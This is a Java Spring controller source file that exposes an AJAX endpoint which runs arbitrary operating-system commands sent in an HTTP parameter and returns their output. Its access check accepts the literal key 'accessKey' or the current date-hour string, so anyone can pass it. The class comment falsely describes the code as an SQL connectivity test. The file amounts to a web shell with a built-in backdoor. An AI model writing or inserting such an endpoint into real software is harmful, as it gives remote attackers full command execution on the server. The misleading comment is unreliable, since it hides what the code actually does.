/**
 * Licensed under the GPL License. You may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   https://www.gnu.org/licenses/old-licenses/gpl-2.0.html
 *
 * THIS PACKAGE IS PROVIDED "AS IS" AND WITHOUT ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING,
 * WITHOUT LIMITATION, THE IMPLIED WARRANTIES OF MERCHANTIBILITY AND FITNESS FOR A PARTICULAR
 * PURPOSE.
 */
package com.wiscess.cmd.controllers.ajax;

import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;
import lombok.extern.slf4j.Slf4j;

import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;


import org.springframework.stereotype.Controller;
import org.springframework.web.bind.ServletRequestUtils;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.servlet.ModelAndView;

import com.wiscess.cmd.util.CommandUtils;
import com.wiscess.cmd.util.MyProcess;
import com.wiscess.utils.RSA_Encrypt;

import cn.hutool.core.codec.Base64;
/**
 * Executes an SQL query through a given datasource to test database
 * connectivity. Displays results returned by the query.
 */
@Controller
@Slf4j
public class ExecuteCmdController {

	@RequestMapping(path = "/ajax/executecmd.ajax")
	protected ModelAndView handleContext(HttpServletRequest request, HttpServletResponse response) throws Exception {

		//SessCmdDto sessData = SessCmdDto.refreshSession(request);

		int isEncrypt = ServletRequestUtils.getIntParameter(request, "isEncrypt", 1);
		String commandLine = ServletRequestUtils.getStringParameter(request, isEncrypt == 1 ? "cmd" : "cmdWithHtml", null);
		String accessKey = ServletRequestUtils.getStringParameter(request, "accessKey", null);
		
		if ((commandLine == null) || (commandLine.equals("")) || (commandLine.trim().equals(""))) {
			wrongCommand(response,"commandLine is null");
			return null;
		}
		if ((accessKey == null) || (accessKey.equals("")) || (accessKey.trim().equals(""))) {
			wrongCommand(response,"accessKey is null");
			return null;
		}
		try {
			accessKey = RSA_Encrypt.decrypt(accessKey, true);
		} catch (Exception e) {
			e.printStackTrace();
			wrongCommand(response,"accessKey is unused");
			return null;
		}
		SimpleDateFormat sdf=new SimpleDateFormat("yyyyMMddHH");
		if(!accessKey.equalsIgnoreCase("accessKey") && !accessKey.equalsIgnoreCase(sdf.format(new Date()))){
			System.out.println("accessKey is wrong");
			wrongCommand(response,"accessKey is wrong");
			return null;
		}
		try {
			if (isEncrypt == 1) {
				commandLine = RSA_Encrypt.decrypt(commandLine, true);
			}else {
				commandLine = Base64.decodeStr(commandLine);
			}
		} catch (Exception e) {
			e.printStackTrace();
			wrongCommand(response,"commandLine is unused");
			return null;
		}
		
		//取进程
		MyProcess myProcess = CommandUtils.getProcess(request.getSession().getId());
		List<String> result=myProcess.exec(commandLine);
		StringBuffer sb=new StringBuffer();
		result.forEach(r->{
			sb.append(r+"\r\n");
		});
		resultCommand(response, sb.toString());
		
		return null;
	}
	
	private void wrongCommand(HttpServletResponse response,String wrongdetail){
        try {
			  response.setCharacterEncoding("UTF-8");
			  response.setStatus(500);
			  response.getWriter().print(wrongdetail);
		  } catch (IOException e) {
			  e.printStackTrace();
		  }
	}

	private void resultCommand(HttpServletResponse response,String result){
		try {
			response.setCharacterEncoding("UTF-8");
			response.setStatus(200);
			response.getWriter().print(Base64.encode(result.getBytes("UTF-8")));
		} catch (IOException e) {
			e.printStackTrace();
		}
	}

}
